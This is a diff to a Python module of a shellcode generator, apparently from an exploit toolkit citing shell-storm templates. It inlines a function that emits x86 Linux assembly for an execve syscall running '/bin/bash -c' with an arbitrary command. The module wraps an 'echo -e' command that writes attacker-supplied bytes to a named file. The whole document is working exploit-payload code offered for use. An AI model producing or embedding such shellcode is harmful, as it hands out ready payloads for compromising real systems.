@@ -9,7 +9,32 @@ shellcode template used : http://shell-storm.org/shellcode/files/shellcode-57.ph
 '''
 import binascii
 from core import stack
-from core import template
+def sys(command):
+	return '''push   $0xb
+pop    %%eax
+cltd
+push   %%edx
+%s
+mov    %%esp,%%esi
+push   %%edx
+push   $0x632d9090
+pop    %%ecx
+shr    $0x10,%%ecx
+push   %%ecx
+mov    %%esp,%%ecx
+push   %%edx
+push   $0x68
+push   $0x7361622f
+push   $0x6e69622f
+mov    %%esp,%%ebx
+push   %%edx
+push   %%edi
+push   %%esi
+push   %%ecx
+push   %%ebx
+mov    %%esp,%%ecx
+int    $0x80
+'''%(str(command))
 def run(filename,content):
 	content = binascii.b2a_hex(content.replace('[space]',' '))
 	l = len(content) -1
@@ -23,4 +48,4 @@ def run(filename,content):
 			c += '\\x'
 	c = c[:-2]
 	command = 'echo -e "%s" > %s' %(str(c),str(filename)) 
-	return template.sys(stack.generate(command.replace('[space]',' '),'%ecx','string'))
+	return sys(stack.generate(command.replace('[space]',' '),'%ecx','string'))
